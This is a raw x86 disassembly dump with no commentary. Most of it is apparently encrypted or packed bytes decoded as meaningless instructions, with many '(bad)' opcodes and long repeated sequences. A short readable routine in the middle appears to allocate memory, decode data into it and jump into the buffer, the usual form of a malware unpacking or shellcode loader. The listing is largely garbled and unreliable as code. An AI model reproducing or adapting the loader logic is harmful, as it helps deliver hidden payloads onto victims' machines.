  4164be:	mov    al,BYTE PTR [ecx-0x7213b09d]
  4164c4:	sub    eax,0xe704a155
  4164c9:	vsqrtsd xmm5,xmm2,xmm6
  4164cd:	jle    0x416466
  4164cf:	retf   
  4164d0:	and    bh,BYTE PTR [ecx]
  4164d2:	sub    dl,BYTE PTR [edx+0x6a0b0803]
  4164d8:	cmp    al,0x5
  4164da:	xchg   BYTE PTR [edx],dl
  4164dc:	cmc    
  4164dd:	and    BYTE PTR [eax-0x3f],0x46
  4164e1:	sub    eax,DWORD PTR [edx+0x56]
  4164e4:	jl     0x4164c4
  4164e6:	mov    bh,BYTE PTR [edx-0x3a0b11ac]
  4164ec:	fisttp DWORD PTR [ecx]
  4164ee:	cdq    
  4164ef:	adc    al,0xa6
  4164f1:	mov    bh,0x6
  4164f3:	faddp  st(7),st
  4164f5:	sub    eax,0xa7239c4d
  4164fa:	sahf   
  4164fb:	stc    
  4164fc:	imul   esp,DWORD PTR [ebx+0x7ddcfc7f],0xdf273159
  416506:	(bad)  
  416507:	int3   
  416508:	cmp    eax,0x795d8ef0
  41650d:	mov    ch,bh
  41650f:	mov    dl,0x33
  416511:	jle    0x4164dd
  416513:	or     DWORD PTR [ecx-0x64],0x72e80a8a
  41651a:	sub    DWORD PTR ds:0xf88442f5,edi
  416520:	adc    al,0x11
  416522:	mov    eax,0x233cb55
  416527:	sub    al,0x8f
  416529:	mov    ebx,0x1655dc94
  41652e:	sbb    eax,0xe6751f0
  416533:	pop    ebp
  416534:	cmp    bh,ah
  416536:	pop    edi
  416537:	aam    0x77
  416539:	lods   eax,DWORD PTR ds:[esi]
  41653a:	test   BYTE PTR [esi+0x24],dh
  41653d:	inc    esp
  41653e:	sti    
  41653f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416540:	lahf   
  416541:	xchg   ebx,eax
  416542:	repnz pop esp
  416544:	imul   esi,DWORD PTR ds:0xa4ab05b9,0xfffffff5
  41654b:	shl    DWORD PTR [ecx-0x58],1
  41654e:	retf   
  41654f:	les    ebx,FWORD PTR [eax-0x53159872]
  416555:	test   BYTE PTR [esi-0x76976f11],dl
  41655b:	ret    
  41655c:	xor    BYTE PTR ds:0x426ca4e1,bh
  416562:	outs   dx,DWORD PTR ds:[esi]
  416563:	xchg   esi,eax
  416564:	inc    BYTE PTR [ecx+eiz*1]
  416567:	jbe    0x41658d
  416569:	push   ebp
  41656a:	add    DWORD PTR [edx+0x2],edi
  41656d:	pop    edx
  41656e:	arpl   WORD PTR [eax+0x59a482d0],si
  416574:	data16 jp 0x416583
  416577:	imul   ebp,edx,0xffffffa4
  41657a:	mov    ah,0xb8
  41657c:	sub    ch,BYTE PTR [ebx-0x10]
  41657f:	jmp    0x6a04:0x1f1a63f7
  416586:	dec    esp
  416587:	ins    DWORD PTR es:[edi],dx
  416588:	pop    ss
  416589:	mov    esi,0x14cdf034
  41658e:	(bad)  
  41658f:	jmp    0x8f0990f1
  416594:	mov    edi,0xca088b1f
  416599:	icebp  
  41659a:	adc    al,0xcf
  41659c:	rol    BYTE PTR [edi-0x30],0x6
  4165a0:	lea    edi,[esi-0x28f1fb91]
  4165a6:	fadd   QWORD PTR [edx]
  4165a9:	xor    al,0xfb
  4165ab:	or     DWORD PTR [edi+0x5ceb27e7],esi
  4165b1:	retf   
  4165b2:	jg     0x4165b4
  4165b4:	add    bl,BYTE PTR [ecx+edi*2-0x3e]
  4165b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b9:	sar    esp,1
  4165bb:	push   cs
  4165bc:	cmp    BYTE PTR ds:0xf72ef1fd,ah
  4165c2:	(bad)  
  4165c3:	stos   BYTE PTR es:[edi],al
  4165c4:	and    al,BYTE PTR [ecx*2+0x2b48e3d]
  4165cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165cc:	rol    DWORD PTR [ebx],cl
  4165ce:	repz hlt 
  4165d0:	(bad)  
  4165d1:	cmc    
  4165d2:	or     al,0xe0
  4165d4:	inc    esp
  4165d5:	iret   
  4165d6:	ret    0x9350
  4165d9:	clc    
  4165da:	xor    eax,0x1d05863d
  4165df:	and    eax,0xf78bc33d
  4165e4:	xor    BYTE PTR [esi],dl
  4165e6:	fwait
  4165e7:	xchg   edx,eax
  4165e8:	push   cs
  4165e9:	add    eax,0xd119491
  4165ee:	fisttp DWORD PTR [eax+0x4a29634]
  4165f4:	mov    ah,0xb4
  4165f6:	sub    esi,edx
  4165f8:	fidivr DWORD PTR [edx]
  4165fa:	imul   BYTE PTR [ebp+0x74dc3455]
  416600:	and    eax,0xde1dbffa
  416605:	mov    eax,0x495f2687
  41660a:	mov    cl,0xf9
  41660c:	xchg   esi,eax
  41660d:	stc    
  41660e:	fisttp WORD PTR [eax]
  416610:	push   edx
  416611:	sub    BYTE PTR [ecx+eax*1+0x4],ah
  416615:	xchg   ebx,eax
  416616:	sbb    ebp,DWORD PTR [edx]
  416618:	out    0x2e,eax
  41661a:	aad    0x20
  41661c:	pop    ds
  41661d:	pop    es
  41661e:	pop    edx
  41661f:	mov    ah,0xcd
  416621:	add    ah,BYTE PTR [edx]
  416623:	int3   
  416624:	inc    esi
  416625:	sub    ah,dh
  416627:	inc    eax
  416628:	into   
  416629:	gs pop ebp
  41662b:	mov    ch,0xbc
  41662d:	leave  
  41662e:	push   cs
  41662f:	mov    cl,0xd5
  416631:	stc    
  416632:	adc    BYTE PTR [ebx*1-0x9a525dd],0x6
  41663a:	jle    0x416623
  41663c:	icebp  
  41663d:	push   edi
  41663e:	push   es
  41663f:	jbe    0x4165ee
  416641:	xchg   ebx,eax
  416642:	mov    al,0x9d
  416644:	loop   0x416628
  416646:	rcl    DWORD PTR [edi+eiz*4-0x7ed4bae3],1
  41664d:	int3   
  41664e:	test   esp,eax
  416650:	push   es
  416651:	and    BYTE PTR [ebp-0x6f11abb],bl
  416657:	and    ebp,DWORD PTR [esi+0x9589ae7]
  41665d:	sub    BYTE PTR [edx-0x236e7068],dl
  416663:	cwde   
  416664:	mov    ch,0x1f
  416666:	call   0x202c518c
  41666b:	add    eax,0xca15aff1
  416670:	stos   DWORD PTR es:[edi],eax
  416671:	test   BYTE PTR [edx-0x42],dl
  416674:	mov    esi,0xb78e2f85
  416679:	std    
  41667a:	and    eax,0xc0ab19b2
  41667f:	call   DWORD PTR [esi-0x30]
  416682:	std    
  416683:	mul    BYTE PTR [ecx]
  416685:	and    al,0x4f
  416687:	mov    esp,0xc08c5dbb
  41668c:	inc    edi
  41668d:	or     DWORD PTR [eax+ebp*2+0x5c9ba82a],0x53
  416695:	out    0xbb,eax
  416697:	mov    al,0x9b
  416699:	je     0x41669e
  41669b:	shr    BYTE PTR [ebp-0x27c2b910],0x9c
  4166a2:	arpl   WORD PTR [ebx-0x5d],di
  4166a5:	jg     0x416726
  4166a7:	hlt    
  4166a8:	mov    ah,0x68
  4166aa:	inc    ebp
  4166ab:	or     cl,bl
  4166ad:	and    edi,esi
  4166af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b0:	test   al,0x56
  4166b2:	inc    eax
  4166b3:	push   ss
  4166b4:	dec    ecx
  4166b5:	xchg   DWORD PTR [edi-0x73],edi
  4166b8:	not    DWORD PTR [ecx-0x13]
  4166bb:	imul   dl
  4166bd:	cmp    DWORD PTR [ecx],esi
  4166bf:	mov    bl,0xeb
  4166c1:	cmp    al,0xfb
  4166c3:	and    DWORD PTR [esi+0x3058e9bf],eax
  4166c9:	enter  0x58df,0xdd
  4166cd:	inc    ecx
  4166ce:	pop    ds
  4166cf:	loopne 0x4166b2
  4166d1:	scas   al,BYTE PTR es:[edi]
  4166d2:	leave  
  4166d3:	aas    
  4166d4:	(bad)
  4166d7:	in     al,0x89
  4166d9:	mov    ebp,0xf6f45c0e
  4166de:	cwde   
  4166df:	sub    bh,BYTE PTR [esi-0x50]
  4166e2:	mov    ebp,0x80d1adcb
  4166e7:	or     ah,BYTE PTR [eax]
  4166e9:	mov    BYTE PTR [edi],bh
  4166eb:	leave  
  4166ec:	in     al,dx
  4166ed:	add    BYTE PTR [ebp-0x69],cl
  4166f0:	jmp    0x4166cb
  4166f2:	loope  0x4166db
  4166f4:	push   ebx
  4166f5:	addr16 add eax,0xac1a0d51
  4166fb:	pop    edx
  4166fc:	inc    cx
  4166fe:	cld    
  4166ff:	inc    ebp
  416700:	imul   ebp,DWORD PTR [edi+0x48],0x6999a07f
  416707:	sbb    BYTE PTR [ebp-0x6d],0x81
  41670b:	addr16 aam 0x96
  41670e:	push   ebx
  41670f:	xchg   esp,eax
  416710:	repz push ebx
  416712:	and    al,0xbb
  416714:	mov    esp,0xbb3b1d2e
  416719:	fist   DWORD PTR [esi]
  41671b:	(bad)  
  41671c:	call   0x39cc711c
  416721:	push   es
  416722:	dec    ebp
  416723:	push   0xffffffb5
  416725:	rcr    esp,1
  416727:	and    cl,BYTE PTR [eax-0x30]
  41672a:	inc    ebp
  41672b:	stos   DWORD PTR es:[edi],eax
  41672c:	xchg   edx,eax
  41672d:	mov    ebp,DWORD PTR [eax-0x45ff45f]
  416733:	xlat   BYTE PTR ds:[ebx]
  416734:	ds scas al,BYTE PTR es:[edi]
  416736:	sbb    DWORD PTR [eax],edx
  416738:	push   edx
  416739:	(bad)  
  41673c:	sub    al,0x4b
  41673e:	jmp    0x865:0x5bd13a4e
  416745:	addr16 shl DWORD PTR [bx+si-0x2c],cl
  41674a:	cmp    ebp,DWORD PTR [ebp+ebx*4+0x742dc523]
  416751:	sbb    bl,bh
  416753:	sbb    eax,0x7650a3da
  416758:	aad    0x6
  41675a:	mov    dl,0xee
  41675c:	or     al,BYTE PTR [edx+ebp*8]
  41675f:	mov    ds:0xbf875881,eax
  416764:	(bad)  
  416765:	ror    ch,1
  416767:	push   es
  416768:	(bad)  
  416769:	jbe    0x416723
  41676b:	add    BYTE PTR [eax],0xb4
  41676e:	xlat   BYTE PTR ds:[ebx]
  41676f:	lock sub DWORD PTR [ebx-0x7b],esp
  416773:	mov    bh,0x5c
  416775:	dec    esp
  416776:	inc    ebx
  416777:	in     al,dx
  416778:	loop   0x416778
  41677a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41677b:	mov    bh,ch
  41677d:	pop    ebx
  41677e:	pop    edx
  41677f:	or     edi,edx
  416781:	js     0x416706
  416783:	aam    0xb8
  416785:	ins    BYTE PTR es:[edi],dx
  416786:	or     cl,BYTE PTR [esi+0x5cb32823]
  41678c:	in     al,dx
  41678d:	pusha  
  41678e:	retf   
  41678f:	push   esi
  416790:	fnstcw WORD PTR ds:0x8a984822
  416796:	adc    esi,edx
  416798:	jno    0x41671e
  41679a:	cwde   
  41679b:	fidiv  DWORD PTR ds:0xea278c29
  4167a1:	fbstp  TBYTE PTR cs:[esi-0x6489c3b3]
  4167a8:	jp     0x416737
  4167aa:	in     al,0x83
  4167ac:	inc    ecx
  4167ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ae:	lahf   
  4167af:	sub    bh,dh
  4167b1:	test   DWORD PTR ds:0x15ffe29f,0x418014
  4167bb:	mov    DWORD PTR [ebp-0x2c],eax
  4167be:	movzx  eax,WORD PTR [ebp-0x2c]
  4167c2:	cmp    eax,0x539
  4167c7:	jne    0x4167f8
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0xf497934c
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0x4b666612
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	clc    
  4169ce:	les    esp,FWORD PTR [ebx]
  4169d0:	adc    al,0x8e
  4169d2:	in     al,0xaf
  4169d4:	xor    dh,BYTE PTR [ebx]
  4169d6:	push   cs
  4169d7:	dec    ecx
  4169d8:	fnstsw WORD PTR [ebp+0x4a]
  4169db:	sahf   
  4169dc:	mov    bl,0xac
  4169de:	(bad)  
  4169df:	in     al,0xaf
  4169e1:	xor    dh,BYTE PTR [edi]
  4169e3:	push   cs
  4169e4:	dec    ecx
  4169e5:	popf   
  4169e6:	xor    BYTE PTR [ebp-0x72eb4c62],0xe4
  4169ed:	scas   eax,DWORD PTR es:[edi]
  4169ee:	xor    dh,BYTE PTR [edi]
  4169f0:	push   cs
  4169f1:	dec    ecx
  4169f2:	fld    QWORD PTR [edx+0x14b39eb5]
  4169f8:	(bad)  
  4169f9:	in     al,0xaf
  4169fb:	xor    dh,BYTE PTR [edi]
  4169fd:	push   cs
  4169fe:	dec    ecx
  4169ff:	fld    QWORD PTR [edx+0x14b39eb5]
  416a05:	(bad)  
  416a06:	in     al,0xaf
  416a08:	xor    bh,BYTE PTR [edi]
  416a0a:	cmovns ebx,ebp
  416a0d:	mov    WORD PTR [edx+0x3914bd24],gs
  416a13:	in     eax,dx
  416a14:	bound  edx,QWORD PTR [ebx]
  416a16:	(bad)  
  416a17:	syscall 
  416a19:	adc    BYTE PTR [ebx+0x67daf6e1],ah
  416a1f:	lods   eax,DWORD PTR ds:[esi]
  416a20:	xchg   esp,eax
  416a21:	fstp   QWORD PTR [ebp+0x50]
  416a24:	jl     0x416a4e
  416a26:	mov    al,0xa2
  416a28:	(bad)  
  416a29:	(bad)  
  416a2a:	fnstsw WORD PTR [edx-0x1e]
  416a2d:	nop
  416a2e:	(bad)  
  416a2f:	push   eax
  416a30:	push   edx
  416a31:	cmp    ebp,DWORD PTR cs:[eax-0x22086a14]
  416a38:	xor    al,0xc9
  416a3a:	stos   DWORD PTR es:[edi],eax
  416a3b:	cld    
  416a3c:	adc    bl,BYTE PTR [edx+0x61]
  416a3f:	sub    eax,0x93b8acb8
  416a44:	mov    ecx,0xafe48d30
  416a49:	xor    dh,BYTE PTR [edi]
  416a4b:	push   cs
  416a4c:	dec    ecx
  416a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4e:	dec    ebp
  416a4f:	mov    ds:0xf5ba8d10,eax
  416a54:	cmp    DWORD PTR [ecx+0x77d34f9c],edx
  416a5a:	jae    0x416a56
  416a5c:	push   0x50f280bb
  416a61:	mov    BYTE PTR [ecx],0x4a
  416a64:	jmp    0x300a:0x5f0f7a2b
  416a6b:	retf   
  416a6c:	leave  
  416a6d:	test   al,0xd7
  416a6f:	jl     0x416a60
  416a71:	and    ah,BYTE PTR [eax+0x6dd30031]
  416a77:	dec    ebp
  416a78:	outs   dx,BYTE PTR ds:[esi]
  416a79:	das    
  416a7a:	and    ebx,DWORD PTR [edx+esi*2-0x6b0a1efb]
  416a81:	jmp    0x66c2:0x8443cd2c
  416a88:	cmp    DWORD PTR [edx+0x77d34f9c],ecx
  416a8e:	jae    0x416a8b
  416a90:	push   0x506c1cd7
  416a95:	and    DWORD PTR es:[eax-0x16],ebx
  416a99:	ds out 0xa5,eax
  416a9c:	pop    edi
  416a9d:	nop
  416a9e:	lods   eax,DWORD PTR ds:[esi]
  416a9f:	fs leave 
  416aa1:	hlt    
  416aa2:	dec    edx
  416aa3:	xlat   BYTE PTR ds:[ebx]
  416aa4:	out    dx,eax
  416aa5:	adc    bh,BYTE PTR ds:0x1bbd00ab
  416aab:	out    0x6e,al
  416aad:	xor    DWORD PTR [esi-0x66f28dff],edi
  416ab3:	jbe    0x416a49
  416ab5:	(bad)  
  416ab6:	jmp    0x416a8e
  416ab8:	test   BYTE PTR [ebp-0x50c60a46],0x32
  416abf:	aaa    
  416ac0:	push   cs
  416ac1:	dec    ecx
  416ac2:	fld    QWORD PTR [edx+0x14b39eb5]
  416ac8:	(bad)  
  416ac9:	in     al,0xaf
  416acb:	xor    dh,BYTE PTR [edi]
  416acd:	push   cs
  416ace:	dec    ecx
  416acf:	fld    QWORD PTR [edx+0x14b39eb5]
  416ad5:	frstor [ecx+0xf7b32af]
  416adb:	dec    edx
  416adc:	fucom  st(4)
  416ade:	sti    
  416adf:	sar    esp,cl
  416ae1:	adc    al,0x8d
  416ae3:	in     al,0xaf
  416ae5:	xor    dh,BYTE PTR [edi]
  416ae7:	push   cs
  416ae8:	dec    ecx
  416ae9:	cmp    eax,0xb89fb782
  416aee:	adc    eax,0xd0afe487
  416af3:	xor    ecx,DWORD PTR [esi]
  416af5:	dec    ecx
  416af6:	pop    ecx
  416af7:	test   BYTE PTR [ebp-0x72eb4c62],dh
  416afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416afe:	adc    dh,BYTE PTR [edx]
  416b00:	aaa    
  416b01:	push   cs
  416b02:	pop    ecx
  416b03:	fld    QWORD PTR [edx+0x14b69eb5]
  416b09:	(bad)  
  416b0a:	in     al,0xef
  416b0c:	xor    dh,BYTE PTR [edi]
  416b0e:	push   ds
  416b0f:	dec    ecx
  416b10:	fld    QWORD PTR [edx+0x11b39eb7]
  416b16:	(bad)  
  416b17:	in     eax,0xaf
  416b19:	xor    dh,BYTE PTR [edi]
  416b1b:	push   cs
  416b1c:	dec    ecx
  416b1d:	fadd   DWORD PTR [edx+0x14b39eb4]
  416b23:	(bad)  
  416b24:	in     al,0xaf
  416b26:	add    bh,BYTE PTR [ebx]
  416b28:	push   cs
  416b29:	dec    ecx
  416b2a:	fld    DWORD PTR [edx+0x104d94b5]
  416b30:	(bad)  
  416b31:	out    0xaf,al
  416b33:	jb     0x416aeb
  416b35:	push   cs
  416b36:	dec    ecx
  416b37:	int    0x82
  416b39:	mov    ch,0x8e
  416b3b:	mov    bl,0x14
  416b3d:	(bad)  
  416b3e:	in     al,0xbf
  416b40:	xor    dh,BYTE PTR [edi]
  416b42:	push   ds
  416b43:	dec    ecx
  416b44:	fld    QWORD PTR [edx+0x4b39eb5]
  416b4a:	(bad)  
  416b4b:	in     al,0xaf
  416b4d:	xor    dh,BYTE PTR [edi]
  416b4f:	push   cs
  416b50:	dec    ecx
  416b51:	fld    QWORD PTR [edx+0x14b79eb5]
  416b57:	and    esp,0xe3731f6
  416b5d:	dec    ecx
  416b5e:	sbb    eax,0x8ccbb589
  416b63:	adc    al,0x8d
  416b65:	in     al,0xaf
  416b67:	xor    dh,BYTE PTR [edi]
  416b69:	push   cs
  416b6a:	dec    ecx
  416b6b:	fld    QWORD PTR [edx+0x14b39eb5]
  416b71:	(bad)  
  416b72:	in     al,0xaf
  416b74:	xor    dh,BYTE PTR [edi]
  416b76:	cs inc ebp
  416b78:	fstp   QWORD PTR [edx+0x14b39eb5]
  416b7e:	(bad)  
  416b7f:	in     al,0xaf
  416b81:	xor    dh,BYTE PTR [edi]
  416b83:	push   cs
  416b84:	dec    ecx
  416b85:	fld    QWORD PTR [edx+0x14b39eb5]
  416b8b:	(bad)  
  416b8c:	in     al,0xaf
  416b8e:	xor    dh,BYTE PTR [edi]
  416b90:	push   cs
  416b91:	dec    ecx
  416b92:	fld    QWORD PTR [edx+0x14b39eb5]
  416b98:	(bad)  
  416b99:	in     al,0xaf
  416b9b:	xor    dh,BYTE PTR [edi]
  416b9d:	push   cs
  416b9e:	dec    ecx
  416b9f:	fld    QWORD PTR [edx+0x14b39eb5]
  416ba5:	(bad)  
  416ba6:	in     al,0xaf
  416ba8:	xor    dh,BYTE PTR [edi]
  416baa:	push   cs
  416bab:	dec    ecx
  416bac:	fld    QWORD PTR [edx+0x14b39eb5]
  416bb2:	(bad)  
  416bb3:	in     al,0xaf
  416bb5:	xor    dh,BYTE PTR [edi]
  416bb7:	push   cs
  416bb8:	dec    ecx
  416bb9:	fld    QWORD PTR [edx+0x14b39eb5]
  416bbf:	(bad)  
  416bc0:	in     al,0xaf
  416bc2:	xor    dh,BYTE PTR [edi]
  416bc4:	push   cs
  416bc5:	dec    ecx
  416bc6:	fld    QWORD PTR [edx+0x14b39eb5]
  416bcc:	(bad)  
  416bcd:	retf   0x57db
  416bd0:	dec    edi
  416bd1:	jp     0x416c1c
  416bd3:	fld    QWORD PTR [edx+0x14b82eb5]
  416bd9:	(bad)  
  416bda:	hlt    
  416bdb:	scas   eax,DWORD PTR es:[edi]
  416bdc:	xor    dh,BYTE PTR [edi]
  416bde:	push   0xb182dd4d
  416be3:	sahf   
  416be4:	mov    bl,0x44
  416be6:	enter  0x9da7,0x66
  416bea:	js     0x416bfa
  416bec:	dec    ecx
  416bed:	fld    QWORD PTR [edx+0x14939eb5]
  416bf3:	lea    eax,[ecx+eax*4]
  416bf6:	inc    eax
  416bf7:	inc    esp
  416bf8:	jl     0x416c24
  416bfa:	fld    QWORD PTR [edx+0x14d39eb5]
  416c00:	(bad)  
  416c01:	in     al,0x6f
  416c03:	cmp    DWORD PTR [edi],esi
  416c05:	push   cs
  416c06:	sbb    ebx,ebp
  416c08:	xor    BYTE PTR [ebp-0x72eb480c],0xe4
  416c0f:	scas   eax,DWORD PTR es:[edi]
  416c10:	xor    dh,BYTE PTR [edi]
  416c12:	push   cs
  416c13:	dec    ecx
  416c14:	fld    QWORD PTR [edx+0x34b39eb5]
  416c1a:	(bad)  
  416c1b:	in     al,0x4f
  416c1d:	sbb    al,0x45
  416c1f:	imul   esp,DWORD PTR ds:0x9eb5e1b2,0xffffffb3
  416c26:	push   ss
  416c27:	(bad)  
  416c28:	in     al,0xaf
  416c2a:	adc    bh,BYTE PTR [ebx]
  416c2c:	push   cs
  416c2d:	dec    ecx
  416c2e:	fild   WORD PTR [edx+0x100f9eb5]
  416c34:	(bad)  
  416c35:	in     al,0xaf
  416c37:	xor    dh,BYTE PTR [edi]
  416c39:	push   cs
  416c3a:	dec    ecx
  416c3b:	fld    QWORD PTR [edx+0x14b39eb5]
  416c41:	int    0xe4
  416c43:	scas   eax,DWORD PTR es:[edi]
  416c44:	repnz aaa 
  416c46:	push   cs
  416c47:	dec    ecx
  416c48:	fld    QWORD PTR [edx+0x14b39eb5]
  416c4e:	(bad)  
  416c4f:	in     al,0xaf
  416c51:	xor    dh,BYTE PTR [edi]
  416c53:	push   cs
  416c54:	dec    ecx
  416c55:	fld    QWORD PTR [edx+0x14b39eb5]
  416c5b:	(bad)  
  416c5c:	in     al,0xaf
  416c5e:	xor    dh,BYTE PTR [edi]
  416c60:	push   cs
  416c61:	dec    ecx
  416c62:	fld    QWORD PTR [edx+0x14b39eb5]
  416c68:	(bad)  
  416c69:	in     al,0xaf
  416c6b:	xor    dh,BYTE PTR [edi]
  416c6d:	push   cs
  416c6e:	dec    ecx
  416c6f:	fld    QWORD PTR [edx+0x14b39eb5]
  416c75:	(bad)  
  416c76:	in     al,0xaf
  416c78:	xor    dh,BYTE PTR [edi]
  416c7a:	push   cs
  416c7b:	dec    ecx
  416c7c:	fld    QWORD PTR [edx+0x14b39eb5]
  416c82:	(bad)  
  416c83:	in     al,0xaf
  416c85:	xor    dh,BYTE PTR [edi]
  416c87:	push   cs
  416c88:	dec    ecx
  416c89:	fld    QWORD PTR [edx+0x14b39eb5]
  416c8f:	(bad)  
  416c90:	in     al,0xaf
  416c92:	xor    dh,BYTE PTR [edi]
  416c94:	push   cs
  416c95:	dec    ecx
  416c96:	fld    QWORD PTR [edx+0x14b39eb5]
  416c9c:	(bad)  
  416c9d:	in     al,0xaf
  416c9f:	xor    dh,BYTE PTR [edi]
  416ca1:	push   cs
  416ca2:	dec    ecx
  416ca3:	fld    QWORD PTR [edx+0x14b39eb5]
  416ca9:	(bad)  
  416caa:	in     al,0xaf
  416cac:	xor    dh,BYTE PTR [edi]
  416cae:	push   cs
  416caf:	dec    ecx
  416cb0:	fld    QWORD PTR [edx+0x14b39eb5]
  416cb6:	(bad)  
  416cb7:	in     al,0xaf
  416cb9:	xor    dh,BYTE PTR [edi]
  416cbb:	push   cs
  416cbc:	dec    ecx
